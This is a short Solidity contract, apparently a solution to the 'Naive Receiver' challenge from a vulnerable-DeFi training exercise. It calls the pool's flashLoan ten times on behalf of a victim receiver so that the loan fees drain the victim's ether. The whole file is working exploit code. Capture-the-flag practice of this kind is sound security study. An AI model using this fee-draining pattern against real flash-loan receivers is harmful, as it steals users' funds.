pragma solidity ^0.6.0;

import "./NaiveReceiverLenderPool.sol";

contract Drainer {
    address payable victim; 
    NaiveReceiverLenderPool pool;

    constructor(address payable _victim, address payable _pool) public {  
        victim = _victim;
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack() public {
        for(int i = 0; i < 10; i++) {
            pool.flashLoan(victim, 10 ether);
        }
    }
}